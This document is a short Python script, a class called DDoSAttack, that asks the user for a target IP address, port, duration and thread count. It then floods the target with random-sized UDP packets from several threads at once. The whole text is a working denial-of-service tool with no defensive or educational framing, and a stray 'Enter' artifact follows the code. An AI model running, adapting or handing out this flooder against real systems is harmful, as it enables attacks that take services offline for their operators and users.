import socket
import random
import threading
import time

class DDoSAttack:
    def __init__(self, target_ip, target_port, duration, num_threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.num_threads = num_threads
        self.stop_event = threading.Event()

    def send_packets(self):
        try:
            target_address = (self.target_ip, self.target_port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not self.stop_event.is_set():
                payload_size = random.randint(64, 1500)  # Random packet size between 64 and 1500 bytes
                payload = bytearray(random.getrandbits(8) for _ in range(payload_size))
                sock.sendto(payload, target_address)
        except Exception as e:
            print("Error:", e)

    def start_attack(self):
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_packets)
            thread.start()
            threads.append(thread)
        # Run the attack for the specified duration
        time.sleep(self.duration)
        self.stop_attack()

    def stop_attack(self):
        self.stop_event.set()

# Get user input for target IP address, port, and attack duration
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))
attack_duration = int(input("Enter attack duration (in seconds): "))
num_threads = int(input("Enter number of threads: "))

# Create DDoS attack object and start the attack
ddos_attack = DDoSAttack(target_ip, target_port, attack_duration, num_threads)
ddos_attack.start_attack()
￼Enter
